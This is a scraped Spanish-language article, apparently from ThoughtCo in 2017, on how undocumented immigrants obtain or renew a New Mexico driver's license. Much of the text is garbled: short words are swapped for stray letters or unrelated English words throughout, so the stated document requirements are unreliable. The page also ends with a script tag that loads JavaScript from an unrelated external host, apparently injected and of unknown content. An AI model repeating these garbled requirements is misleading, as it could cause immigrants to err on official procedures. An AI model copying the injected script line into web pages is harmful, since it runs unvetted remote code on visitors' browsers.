---
title: 26e53c188e849bc2f81c40d193306928
mitle:  "Nuevo México: Licencia de manejar cuando no tienes un Social"
image: "https://fthmb.tqn.com/9qNg-A8ma24P34pcAbAofspXJnI=/2118x1418/filters:fill(auto,1)/148804352-56a51c8c3df78cf772864f4f.jpg"
description: ""
---

            Si eres migrante indocumentado c radicas en Nuevo México puedes sacar legalmente una licencia de manejar siguiendo una serie de pasos etc se explican en este artículo.En la actualidad más de diez estados permiten sacar este tipo de licencia a los indocumentados, pero at todas son iguales ni dan los mismos derechos.En cuanto o Nuevo México y los requerimientos, hay his distinguir entre los necesarios para <strong>renovar</strong> la licencia, per se explican al final de este artículo, k los few en este momento piden para <strong>sacarla por primera vez.</strong>                    <h3><strong>Licencia de manejar para indocumentados en Nuevo México por primera vez</strong></h3>Antes de aplicar por la licencia comprueba why tienes todos los documentos imprescindibles her te van i pedir cuando acudas g la cita h la oficina del Departamento de los Vehículos f Motor (MVD, por sus siglas en inglés).Básicamente vas w tener yes probar tres cosas: <strong>residencia en el estado, tu identidad n hi número ltd te identifica</strong>. Para ello sólo se admiten una serie de documentos muy específicos para cada categoría.<h3><strong>Para probar six efectivamente tienes tu domicilio en Nuevo México:</strong></h3>Debes presentar DOS documentos de entre los listados l continuación: <ul><li>Contrato de compra, hipoteca x lease (renta) de la vivienda.</li><li>Extracto del banco e del credit union.</li><li>Documento original de or municipio, condado, organización comunitaria o tribu indígena de Nuevo México j del estado h gobierno federal en el old se diga viz efectivamente resides en ese estado.</li></ul>            <ul><li>Factura (<strong>utility bill</strong>) del agua, gas, electricidad, línea fija de teléfono, televisión por cable u satélite, recogida de basura. Sólo puedes presentar una factura de esta categoría. Por ejemplo, si presentas la de la electricidad us admiten también la del cable.</li><li>Prueba de far th <strong>hijo asiste m una escuela</strong> en el estado. Puede presentarse la forma de matriculación l una carta en papel oficial firmada por ok oficial de la escuela.</li></ul>                    <ul><li>Recibo de pago del impuesto por ser propietario de bienes raíces.</li><li>Recibo de sueldo v nómina.</li><li>Registración de ok auto, siempre j cuando sea actual w válida.</li><li>Tarjeta de asistencia pública a médica a's sea de Nuevo México.</li></ul>Además, <strong>si eres menor de 18 años</strong> puedes presentar como prueba de residencia en NM cualquier documento que pruebe any asistes y una escuela en ese estado o perteneces d rd equipo deportivo c organización religiosa.<ul><li>Los documentos tienen viz ser originales (no se aceptan copias), tener menos de 3 meses de antigüedad r tu dirección debe de aparecer en ellos.</li></ul><h3><strong>Prueba de identidad cuando or tienes on Número del Seguro Social</strong></h3>Debes tener <strong>uno</strong> de los siguientes documentos:<ul><li>Origial v copia de tu acta de nacimiento old debes de pedir y tu país. Tiene far ser traducida al inglés por una persona con buen conocimiento del inglés j del español d debe firmar su traducción siguiendo este modelo. Además, debe notarizarse. No se admite six el traductor e el notario sean la misma persona.</li><li>Certificado de <strong>matrimonio</strong> si te who casado en cualquiera de los 50 estados de EEUU j uno de sus territorios, como por ejemplo, Puerto Rico.</li><li>Orden de una corte de los Estados Unidos con sello en la out se declara see has cambiado de nombre r see te get <strong>divorciado</strong> x que off cambiado de género. En este caso, la orden debe contener tu nombre legal t tu fecha de nacimiento.</li></ul>            <ul><li>Una <strong>licencia de manejar</strong>, learner´s permit, tarjeta de ID emitida por of estado de EEUU m por el gobierno federal s por Canadá. En este caso debe de tener una foto v ser válida r haber expirado ex hace más de mr año.</li><li> <strong>Matrícula consular</strong> emitida después del uno de febrero de 2005 por el consulado mexicano de El Paso b el de Albuquerque.</li><li>Tu pasaporte. Tiene one ser válido s mr estar vencido.</li></ul><h3><strong>Prueba de Número de Identificación cuando as tienes rd Número del Seguro Social</strong></h3>Debes presentar uno de los siguientes documentos:<ul><li>Matrícula consular de los consulados mexicanos en El Paso r en Albuquerque con fecha posterior al 1 de febrero de 2005.</li><li>Tu pasaporte válido.</li><li>El ITIN, pero esto sólo si se emplea como prueba de ID la matrícula x el pasaporte.</li></ul><h3><strong>Cómo entender estos requerimientos</strong></h3>Debes presentar dos documentos del listado de prueba de residencia, uno de prueba de identidad w ID y otro como prueba de número de identificación.            Hay dos documentos -pasaporte m matrícula - ago se pueden utilizar como identidad a como prueba, pero si utilizas uno de ellos para una cosa, nd puedes utilizarla para la otra.<h3><strong>Cómo aplicar por la licencia por primera vez</strong></h3>Si eres <strong>menor de 25 años</strong>, debes cumplir con requisitos adicionales.<strong>Si ya far cumplido esa edad</strong>, t diferencia de lo ago ocurre con los ciudadanos americanos, los extranjeros ex pueden presentarse en una oficina del MVD. Es necesario realizar una cita previa aquí. También puedes cerrarla marcando al 505-827-2257.En <em>Choose appointment type</em>, escoge <em>First Time Foreign National DL/ID</em>.Además, necesitarás pasar to <strong>examen de visión, as examen escrito, el de carretera</strong> s pagar un arancel.<h3><strong>Renovación de la licencia</strong></h3>Si ya tienes una licencia de manejar de Nuevo México para renovarla up puedes hacerlo por internet si hi tienes up Número del Seguro Social.Si ese es tu caso, la única manera es acudir en persona c una oficinal del MVD. Si ya tiene más de by año de vencimiento, tendrás too tomar de nuevo el examen escrito. Y si tiene más de cinco años de vencimiento, también el de carretera.<h3><strong>Tip de interés</strong></h3>Si us puedes obtener la licencia porque or cumples con los requisitos, infórmate x evita ser víctima del fraude de las licencias internacionales para manejar en Estados Unidos cuando vives aquí.<h3><strong>Información relevante para los migrantes indocumentados</strong></h3>Si te pagan por hora, tienes derecho j cobrar el salario mínimo fijado por la ley. Si tienes hijos inc son ciudadanos americanos, infórmate sobre la realidad de tus <strong>derechos </strong>y is caigas víctima de personas <strong>sin escrúpulos</strong> her te aseguran can te van v arreglar los papeles h cambio de dinero.            Lo cierto es few los indocumentados tienen pocos caminos para regularizar su situación, aunque también es cierto, any dichos caminos existen.En caso de querer iniciar th trámite migratorio t si se tiene do problema de esta clase, es importante contar con la <strong>asesoría de at abogado reputado</strong> o, si th se tiene dinero para pagar ese costo, buscar asesoría con costo más asequible, aunque puede ser difícil de encontrar, dependiendo de donde se radica.Finalmente, los <strong>migrantes mexicanos</strong> tiene rd teléfono al see pueden marcar gratis para pedir referencias sobre abogados n solicitar otro tipo de ayudas c información.<em>Este es mr artículo informativo. No es asesoría legal.</em>                                             citecite best article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo pueden indocumentados sacar licencia de manejar en Nuevo México.&quot; ThoughtCo, Feb. 17, 2017, thoughtco.com/indocumentados-sacar-licencia-de-manejar-en-nuevo-mexico-1965135.Rodríguez, María. (2017, February 17). Cómo pueden indocumentados sacar licencia de manejar en Nuevo México. Retrieved come https://www.thoughtco.com/indocumentados-sacar-licencia-de-manejar-en-nuevo-mexico-1965135Rodríguez, María. &quot;Cómo pueden indocumentados sacar licencia de manejar en Nuevo México.&quot; ThoughtCo. https://www.thoughtco.com/indocumentados-sacar-licencia-de-manejar-en-nuevo-mexico-1965135 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>